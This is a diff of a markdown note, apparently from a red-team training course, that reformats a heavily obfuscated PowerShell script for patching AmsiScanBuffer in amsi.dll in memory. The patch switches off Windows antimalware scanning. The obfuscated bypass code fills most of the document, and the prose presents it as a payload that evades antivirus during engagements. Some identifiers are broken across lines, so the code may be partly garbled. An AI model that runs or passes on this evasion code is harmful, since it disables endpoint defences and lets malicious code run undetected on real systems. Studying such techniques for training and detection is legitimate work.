@@ -39,72 +39,75 @@ To break it down:
 ---
 ### Further Obfuscated **amsi_bypass.ps1**
 
-`${methODdEf<code>i`
-`NI`
-`T`
-`ion} =   ('`
-`' + '`
- `' + ' '+' ' +  ' ' +  ("[DllImport(`
-`"kernel32`
-`")]`
- `"+  '') +  ' '+' '  +  ' ' +  'p'  + (  "{1}{0}"-f 'ic ','ubl' ) +  'st'+ ( "{1}{0}" -f'c ','ati') +(  "{0}{1}"-f 'ext','ern' ) +' '+  'Int' + ( "{0}{1}"-f 'P','tr ' )  + ("{0}{1}"-f 'G','etPr'  )+'oc' +'Ad'+  'dre'+  's'+  's'+( ( ("{2}{0}{1}"-f'r',' ','(IntPt' )  )) +  (  "{1}{0}"-f 'od','hM'  )+ ("{1}{0}" -f'e,','ul')  +' '+  ("{1}{0}" -f 'tri','s')  +'n','am','ro' +'cN' + ((( "{1}{0}{2}"-f 'e);`
-`') ) )  + '`
-`'+' '+' ' + ' '  + ' '  +  (  "[DllImport(`
-`"kernel32`
-`")]`
- `" + ''  )+ ' '+ ' ' +' '+  'pu'+'b' +  ("{0}{1}" -f'lic',' ' )+'st'  +  ( "{1}{0}"-f 'c ','ati')+'ext' +'er' +'n '+ 'In'  +  (  "{0}{1}" -f'tP','tr '  )  + ("{1}{0}" -f'ule','GetMod'  )+ (  "{0}{1}"-f'Ha','ndl'  )+  'e(s' +("{1}{0}"-f'ng','tri' )+' '  + 'lpM' +( "{0}{1}"-f 'odu','leN' ) + 'a' +  'm'  +  'e'+  (  (( "{1}{2}{0}"-f'`
- `',');','`
-`')  )) + ' '  +' '+' '  +  ( "[DllImport(`
-`"kernel32`
-`")]`
- `"+''  )  + ' '+' '+' '+  'pub'+  ("{0}{1}" -f 'lic',' ' ) + 'sta'  +("{1}{0}" -f ' ','tic'  )+'ex'+ (  "{0}{1}"-f'ter','n ' ) +  'b'+(  "{0}{1}"-f'o','ol '  )  +(  "{1}{0}" -f'u','Virt' ) +'al'  +  (  "{2}{0}{1}"-f'ot','ec','Pr')+ ((  ( "{1}{0}" -f 'IntP','t('  )) ) + 'tr '  +( "{0}{2}{1}"-f'lpA','es','ddr') +'s,'  + ' '+'U'  +( "{0}{1}"-f'In','tP'  )+ 'tr '+'d' +("{0}{1}" -f 'wSiz','e,' )+  ' ' +'u' +( "{0}{1}"-f 'int',' ')  + 'f'+ (  "{2}{1}{0}" -f'ot','Pr','lNew'  ) +  ("{1}{0}"-f',','ect') + ' '  +'out'  + ' '+  'uin'+ 't '+  'l'+  (  "{0}{1}" -f 'pflO','ldP' )  +  ( (  ( "{1}{0}{2}"-f 'ect)','rot',';') )  )  +'`
-`'  )  ;`
+```
+${methODdEf<code>i
+NI
+T
+ion} =   ('
+' + '
+ ' + ' '+' ' +  ' ' +  ("[DllImport(
+"kernel32
+")]
+ "+  '') +  ' '+' '  +  ' ' +  'p'  + (  "{1}{0}"-f 'ic ','ubl' ) +  'st'+ ( "{1}{0}" -f'c ','ati') +(  "{0}{1}"-f 'ext','ern' ) +' '+  'Int' + ( "{0}{1}"-f 'P','tr ' )  + ("{0}{1}"-f 'G','etPr'  )+'oc' +'Ad'+  'dre'+  's'+  's'+( ( ("{2}{0}{1}"-f'r',' ','(IntPt' )  )) +  (  "{1}{0}"-f 'od','hM'  )+ ("{1}{0}" -f'e,','ul')  +' '+  ("{1}{0}" -f 'tri','s')  +'n','am','ro' +'cN' + ((( "{1}{0}{2}"-f 'e);
+') ) )  + '
+'+' '+' ' + ' '  + ' '  +  (  "[DllImport(
+"kernel32
+")]
+ " + ''  )+ ' '+ ' ' +' '+  'pu'+'b' +  ("{0}{1}" -f'lic',' ' )+'st'  +  ( "{1}{0}"-f 'c ','ati')+'ext' +'er' +'n '+ 'In'  +  (  "{0}{1}" -f'tP','tr '  )  + ("{1}{0}" -f'ule','GetMod'  )+ (  "{0}{1}"-f'Ha','ndl'  )+  'e(s' +("{1}{0}"-f'ng','tri' )+' '  + 'lpM' +( "{0}{1}"-f 'odu','leN' ) + 'a' +  'm'  +  'e'+  (  (( "{1}{2}{0}"-f'
+ ',');','
+')  )) + ' '  +' '+' '  +  ( "[DllImport(
+"kernel32
+")]
+ "+''  )  + ' '+' '+' '+  'pub'+  ("{0}{1}" -f 'lic',' ' ) + 'sta'  +("{1}{0}" -f ' ','tic'  )+'ex'+ (  "{0}{1}"-f'ter','n ' ) +  'b'+(  "{0}{1}"-f'o','ol '  )  +(  "{1}{0}" -f'u','Virt' ) +'al'  +  (  "{2}{0}{1}"-f'ot','ec','Pr')+ ((  ( "{1}{0}" -f 'IntP','t('  )) ) + 'tr '  +( "{0}{2}{1}"-f'lpA','es','ddr') +'s,'  + ' '+'U'  +( "{0}{1}"-f'In','tP'  )+ 'tr '+'d' +("{0}{1}" -f 'wSiz','e,' )+  ' ' +'u' +( "{0}{1}"-f 'int',' ')  + 'f'+ (  "{2}{1}{0}" -f'ot','Pr','lNew'  ) +  ("{1}{0}"-f',','ect') + ' '  +'out'  + ' '+  'uin'+ 't '+  'l'+  (  "{0}{1}" -f 'pflO','ldP' )  +  ( (  ( "{1}{0}{2}"-f 'ect)','rot',';') )  )  +'
+'  )  ;
 
-`${ke`
-`RN`
-`El32}  =   Add-Type -MemberDefinition ${METhODd`
-`EfIN`
-`I`TioN} -Name ('K'+ 'ern' +( "{1}{0}" -f'2','el3')  ) -NameSpace (("{0}{1}" -f'Win','3' )+ '2' ) -PassThru  ;`
-`${a`BSd}  =   (  'Ams'+'iS'  ) + (  'ca'+'nB' +  ( "{0}{1}"-f'uffe','r'  )  );`
-`${H`
-`An`
-`DLe}   =  [Win32.Kernel32]::GetModuleHandle( (  'a'+( "{2}{0}{1}"-f '.d','ll','msi'  )) );`
-`[IntPtr]${Buf`
-`F`
-`Er`
-`A`
-`DDREss} = [Win32.Kernel32]::GetProcAddress( ${H`
-`AN`
-`dle}, ${Ab`SD}) ;`
-`[UInt32]${S`iZE}  = 0x5;`
-`[UInt32]${pROTECT`
-`F`
-`lAg}   =   0x40;`
-`[UInt32]${o`
-`ldpROTE`
-`cT`
-`Fl`
-`Ag}  =  0;`
-`[Win32.Kernel32]::VirtualProtect( ${BuF`
-`FerADDr`
-`eSS}, ${Si`
-`zE}, ${prOTeC`
-`TFL`
-`Ag}, [Ref]${oLd`
-`pr`
-`oT`
-`EC`TFlag}  ) ;`
-`${b`Uf}  =  [Byte[]]( [UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3  ) ;`
-`[PSObject].Assembly.GetType( ( ("{1}{0}"-f'st','Sy'  ) +'em'+'.Ma' +  ("{0}{1}"-f'nage','m'  )+ 'ent'  +'.A' +'uto' +("{0}{1}" -f 'mation.T','y')  +'p'+'eA'  + 'cc'+  'e'  +  ("{0}{1}" -f'l','era' )+  ( "{1}{0}" -f's','tor'  )  )  )::Add(  ((  "{0}{1}"-f 'd','1ks')+'t1k' ), [system.runtime.interopservices.marshal]  )`
-`[d1kst1k]::copy(  ${B`
-`Uf}, 0, ${b`
-`UffeR`
-`AdD`
-`R`Ess}, 6)  ; 4`
+${ke
+RN
+El32}  =   Add-Type -MemberDefinition ${METhODd
+EfIN
+ITioN} -Name ('K'+ 'ern' +( "{1}{0}" -f'2','el3')  ) -NameSpace (("{0}{1}" -f'Win','3' )+ '2' ) -PassThru  ;
+${aBSd}  =   (  'Ams'+'iS'  ) + (  'ca'+'nB' +  ( "{0}{1}"-f'uffe','r'  )  );
+${H
+An
+DLe}   =  [Win32.Kernel32]::GetModuleHandle( (  'a'+( "{2}{0}{1}"-f '.d','ll','msi'  )) );
+[IntPtr]${Buf
+F
+Er
+A
+DDREss} = [Win32.Kernel32]::GetProcAddress( ${H
+AN
+dle}, ${AbSD}) ;
+[UInt32]${SiZE}  = 0x5;
+[UInt32]${pROTECT
+F
+lAg}   =   0x40;
+[UInt32]${o
+ldpROTE
+cT
+Fl
+Ag}  =  0;
+[Win32.Kernel32]::VirtualProtect( ${BuF
+FerADDr
+eSS}, ${Si
+zE}, ${prOTeC
+TFL
+Ag}, [Ref]${oLd
+pr
+oT
+ECTFlag}  ) ;
+${bUf}  =  [Byte[]]( [UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3  ) ;
+[PSObject].Assembly.GetType( ( ("{1}{0}"-f'st','Sy'  ) +'em'+'.Ma' +  ("{0}{1}"-f'nage','m'  )+ 'ent'  +'.A' +'uto' +("{0}{1}" -f 'mation.T','y')  +'p'+'eA'  + 'cc'+  'e'  +  ("{0}{1}" -f'l','era' )+  ( "{1}{0}" -f's','tor'  )  )  )::Add(  ((  "{0}{1}"-f 'd','1ks')+'t1k' ), [system.runtime.interopservices.marshal]  )
+[d1kst1k]::copy(  ${`B`
+Uf}, 0, ${b
+UffeR
+AdD
+REss}, 6)  ; 4
+```
+
 
 
 If obfuscated efficiently, you should now have a successful PowerShell payload that will bypass anti-virus and make reverse engineering harder. Before executing on a production environment, you should always experiment and test on your development server to ensure that everything goes smoothly during the actual production engagement.  
 
-In the next task, we will cover what you can do when obfuscation fails, or you need to use something that isn't purely written in PowerShell by utilizing code review and ThreatCheck/DefenderCheck.
+In the next task, we will cover what you can do when obfuscation fails, or you need to use something that isn't purely written in PowerShell by utilizing code review and `ThreatCheck/DefenderCheck`.
 
 **Next step:** [[Task 34 - 'Ca' + 'n' + 'you' + ' ' + 'see' + 'me now' + '?']]
